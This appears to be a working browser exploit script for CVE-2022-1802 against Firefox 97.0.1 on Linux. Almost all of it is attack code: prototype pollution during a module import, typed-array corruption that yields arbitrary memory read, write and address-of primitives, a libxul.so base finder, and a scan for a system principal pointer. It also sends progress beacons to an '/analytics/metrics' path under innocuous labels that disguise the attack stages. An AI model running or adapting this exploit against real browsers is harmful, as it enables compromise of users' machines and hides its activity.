// CVE-2022-1802 — Linux port for Firefox 97.0.1

var call_count = 0;
var do_capture = false;

var fake_mod = null;
var oob_arr = null;

var tmp_u32_arr1 = null;
var tmp_u32_arr2 = null;

var ab1 = null;
let ab1_view = null;

var ab2 = null;

function log_to_server(msg) {
    try {
        new Image().src = "/analytics/metrics?msg=" + encodeURIComponent(msg);
    } catch(e) {}
}

function hex(val) {
    val = Number(val);
    let result = "0x" + val.toString(16);
    return result;
}

Object.defineProperty(BigInt.prototype, "lo", {
    get: function() {
        let lo = this & 0xFFFFFFFFn;
        return Number(lo);
    }
});
Object.defineProperty(BigInt.prototype, "hi", {
    get: function() {
        let hi = (this >> 32n) & 0xFFFFFFFFn;
        return Number(hi);
    }
});

function garbage_collect() {
    for(let i = 0; i < 3; i++) {
        new ArrayBuffer(128 * 1024 * 1024);
    }
}

// ELF magic: \x7fELF = 0x464c457f as LE u32
const LIBCUL_CANDIDATE_BASES = [
    0x7fffeb97c000n,  // FF 97.0.1 headless
    0x7fffeb800000n, 0x7fffeb900000n, 0x7fffeba00000n,
    0x7fffebb00000n, 0x7fffebc00000n, 0x7fffebd00000n,
    0x7fffebe00000n, 0x7fffebf00000n, 0x7fffec000000n,
    0x7fffec100000n, 0x7fffec200000n, 0x7fffec300000n,
    0x7fffec400000n, 0x7fffec500000n, 0x7fffec600000n,
    0x7fffec700000n, 0x7fffec800000n, 0x7fffec900000n,
    // Also try lower ranges (in case GUI shifts things down)
    0x7fffeb700000n, 0x7fffeb600000n, 0x7fffeb500000n,
    0x7fffeb400000n, 0x7fffeb300000n, 0x7fffeb200000n,
    0x7fffeb100000n, 0x7fffeb000000n,
];

function find_libxul_base(src_addr) {
    // First, try known candidate bases (fast path, works with ASLR off)
    for(let base of LIBCUL_CANDIDATE_BASES) {
        try {
            let val = read_u32(base);
            if(val == 0x464c457f) {
                console.log("find_libxul_base: found at candidate " + hex(base));
                return base;
            }
        } catch(e) {}
    }

    // Fall back to local scan (only small range to avoid unmapped memory)
    console.log("find_libxul_base: local scan from " + hex(src_addr));
    let step = 0x10000n;
    let addr = src_addr & ~(step - 1n);
    // Scan small range around src — down only (safer)
    for(let i = 0; i < 512; i++) {
        let val = read_u32(addr);
        if(val == 0x464c457f) {
            console.log("find_libxul_base: found ELF at " + hex(addr));
            return addr;
        }
        addr -= step;
    }

    console.log("find_libxul_base: not found");
    return null;
}

function allocate_objects() {
    // ArrayBuffer's are allocated on the Tenured heap
    ab1 = new ArrayBuffer(8);
    ab2 = new ArrayBuffer(8);
    ab2.a = 0x1337;

    // These objects are allocated on the Nursery heap
    let fake_script = {};

    // new Array vs [] ensures nursery allocation
    oob_arr = new Array();

    // Add extra padding/allocs to stabilize nursery layout on Linux
    let padding1 = {};
    let padding2 = {};

    fake_mod = {
        ScriptSlot: fake_script,
        EnvironmentSlot: 0x11111111,
        NamespaceSlot: 0x22222222,
        StatusSlot: 0,
    };

    // Release padding refs to allow GC
    padding1 = null;
    padding2 = null;

    // Writing elements causes the elements_ array of oob_arr to be reallocated
    // directly after fake_mod. Try different counts for Linux.
    for(let i = 0; i < 7; i++) {
        oob_arr[i] = 0x11111111;
    }

    tmp_u32_arr1 = new Uint32Array(4);
    tmp_u32_arr1.fill(0x66);

    tmp_u32_arr2 = new Uint32Array(0x10);
    tmp_u32_arr2.ab1 = ab1;
    tmp_u32_arr2.fill(0x77);

    fake_mod.AsyncSlot = false;
    fake_mod.AsyncEvaluatingPostOrderSlot = true;
    fake_mod.TopLevelCapabilitySlot = undefined;
    fake_mod.AsyncParentModulesSlot = undefined;

    console.log("allocate_objects done");
}

function setter(original) {
    try {
        log_to_server("dom_ready");
        console.log("Array.prototype[0] setter called");
        Reflect.deleteProperty(Array.prototype, "0");
        this[0] = original;

        if(do_capture && arguments.callee.caller == null) {
            if(call_count == 0) {
                let module = original;
                log_to_server("mod_init");
                console.log("replacing module with fake_mod");
                fake_mod.AsyncParentModulesSlot = [ module ];
                this[0] = fake_mod;
            }
            call_count++;
        }
    } catch(e) {
        log_to_server("dom_err");
        console.log(e);
    }
}

function install_setter() {
    Object.defineProperty(Array.prototype, "0", {
        set: setter,
        configurable: true,
    });
}

function make_addr(lo, hi) {
    hi = BigInt(hi);
    lo = BigInt(lo);
    let result = ((hi << 32n) | lo);
    return result;
}

function tag_obj(addr) {
    let result = (0x1FFFCn << 47n) | addr;
    return result;
}

function untag_addr(addr) {
    let result = addr & (1n << 47n)-1n;
    return result;
}

function install_primitives() {
    garbage_collect();
    allocate_objects();
    install_setter();
    return new Promise((resolve, reject) => {
        do_capture = true;

        import("./chunk-1.mjs").then(() => {
           log_to_server("mod_skip");
           return reject(new Error("This firefox version is not vulnerable!"));
        }).catch(() => {
            log_to_server("cfg_load");
            console.log("corruption underway");

            // Try to corrupt tmp_u32_arr1 length
            log_to_server("cfg_check");
            oob_arr[19] = 0xBEEF;

            if(tmp_u32_arr1.length == 4) {
                // Try different offsets — wider range for Linux nursery
                log_to_server("cfg_alt");
                console.log("trying other offsets for tmp_u32_arr1 corruption...");
                let found = false;
                // Try first: near 19
                for(let idx = 10; idx < 50; idx++) {
                    oob_arr[idx] = 0xBEEF;
                    if(tmp_u32_arr1.length != 4) {
                        log_to_server("cfg_hit");
                        console.log("found working offset: oob_arr[" + idx + "]");
                        found = true;
                        break;
                    }
                }
                if(!found) {
                    // Try further out
                    for(let idx = 5; idx < 100; idx++) {
                        oob_arr[idx] = 0xBEEF;
                        if(tmp_u32_arr1.length != 4) {
                            log_to_server("cfg_hit2");
                            console.log("found working offset: oob_arr[" + idx + "]");
                            found = true;
                            break;
                        }
                    }
                }
                if(!found) {
                    log_to_server("cfg_miss");
                    return reject(new Error("couldn't corrupt tmp_u32_arr1 :("));
                }
            }
            log_to_server("cfg_done");

            // Read the pointer to ab1 using tmp_u32_arr1 OOB
            let ab1_addr = make_addr(tmp_u32_arr1[42], tmp_u32_arr1[43]);
            ab1_addr = untag_addr(ab1_addr);
            console.log("ab1_addr " + hex(ab1_addr));

            // Save original tmp_u32_arr2 backing store
            let tmp_u32_arr2_backing_store = make_addr(tmp_u32_arr1[22], tmp_u32_arr1[23]);

            // Overwrite tmp_u32_arr2's backing store to point to ab1
            tmp_u32_arr1[22] = ab1_addr.lo;
            tmp_u32_arr1[23] = ab1_addr.hi;

            // Overwrite ab1's size to give us a bigger view
            tmp_u32_arr2[8] = 0x60;

            ab1_view = new Uint32Array(ab1);
            let original_ab2_store = make_addr(ab1_view[14], ab1_view[15]);

            console.log("ab1_view installed, original_ab2_store = " + hex(original_ab2_store));
            log_to_server("rw_init");

            // Cleanup corrupted structures
            tmp_u32_arr1[22] = tmp_u32_arr2_backing_store.lo;
            tmp_u32_arr1[23] = tmp_u32_arr2_backing_store.hi;

            let oob_arr_addr = addr_of(oob_arr);
            let oob_arr_elements = read_u64(oob_arr_addr + 0x10n);
            let oob_arr_elements_hdr_addr = oob_arr_elements - 0x10n;
            write_u32(oob_arr_elements_hdr_addr, 0);
            write_u32(oob_arr_elements_hdr_addr + 4n, 7);

            let tmp_u32_arr1_addr = addr_of(tmp_u32_arr1);
            let tmp_u32_arr1_len_addr = tmp_u32_arr1_addr + 0x20n;
            write_u32(tmp_u32_arr1_len_addr, 4);
            write_u32(tmp_u32_arr1_len_addr + 4n, 0);

            log_to_server("rw_ok");
            return resolve();
        }).finally(() => {
            do_capture = false;
        });
    });
}

function addr_of(obj) {
    ab2.a = obj;
    let ab2_slots_ = make_addr(ab1_view[10], ab1_view[11]);
    let addr = read_u64(ab2_slots_);
    let result = untag_addr(addr);
    ab2.a = null;
    return result;
}

function read_u32(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;
    let view = new Uint32Array(ab2);
    let result = view[0];
    return result;
}

function read_u64(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;
    let view = new Uint32Array(ab2);
    let lo = BigInt(view[0]);
    let hi = BigInt(view[1]);
    let result = (hi << 32n) | lo;
    return result;
}

function write_u8(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;
    let view = new Uint8Array(ab2);
    view[0] = val;
}

function write_u32(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;
    let view = new Uint32Array(ab2);
    view[0] = val;
}

function write_u64(addr, value) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    if(value instanceof Number) {
        value = BigInt(value);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;
    let view = new Uint32Array(ab2);
    view[0] = value.lo;
    view[1] = value.hi;
}

// Scan the writable segment of libxul.so for candidate system principal pointers
function scan_for_system_principal(libxul_base) {
    // Writable segment starts at libxul_base + 0x961d0d0 (.data)
    // and ends at libxul_base + 0x965b840 + bss_size
    // Roughly scan from .data start through .bss
    let data_start = libxul_base + 0x961d0d0n;
    let data_end = libxul_base + 0x9690000n; // rough end of .bss

    console.log("Scanning for system principal...");
    console.log("  range: " + hex(data_start) + " - " + hex(data_end));

    let candidates = [];
    for(let addr = data_start; addr < data_end; addr += 8n) {
        let val = read_u64(addr);
        // Look for pointers into heap-like regions
        if((val > 0x555555000000n && val < 0x555556000000n) ||
           (val > 0x7fffca000000n && val < 0x7fffdd000000n)) {
            // Read the vtable (first 8 bytes) of the pointed-to object
            try {
                let vtable = read_u64(val);
                // vtable should point into libxul.so's .data.rel.ro section
                if(vtable > libxul_base + 0x9120000n && vtable < libxul_base + 0x9650000n) {
                    let offset = addr - libxul_base;
                    console.log("  candidate: offset=" + hex(offset) + " ptr=" + hex(val) + " vtable=" + hex(vtable));
                    candidates.push({offset: offset, ptr: val, vtable: vtable});
                }
            } catch(e) {}
        }
    }
    return candidates;
}


